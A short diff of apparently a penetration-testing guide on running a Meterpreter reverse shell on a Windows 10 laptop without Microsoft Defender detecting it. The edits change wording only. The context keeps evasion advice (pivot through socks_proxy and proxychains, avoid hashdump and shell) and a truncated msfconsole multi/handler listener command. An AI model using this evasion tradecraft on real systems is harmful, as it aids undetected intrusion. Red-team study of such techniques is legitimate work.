@@ -74,15 +74,15 @@ DefenderSignaturesOutOfDate      : False
 <SNIP>
 
 
-Step 4 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
-============================================================================================================
+Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop without being detected nor blocked by the MS Defender AV
+==============================================================================================================================================
 
 Important note regarding AV detection 
 --------------------------------------
 => If you want to limit the chance of being detected & blocked by Antivirus like MS Defender it is recommanded to use the Meterpreter session only as a way to pivot
    (i.e. socks_proxy + proxychains).
 => If you use well knwon post-exploitation modules like "hashdump" or even sometimes just the "shell" command, antivirus like MS Defender will detect these actions like
-   'Behavior:Win32/Meterpreter.gen!D' and kill the Meterpreter session.
+   'Behavior:Win32/Meterpreter.gen!D' and will kill the Meterpreter session.
 
 
 
@@ -92,7 +92,6 @@ jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/
 [!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
 [!] Please see /root/.msf4/logs/framework.log for details.
                                                   
-
                                    .,,.                  .
                                 .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                      d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
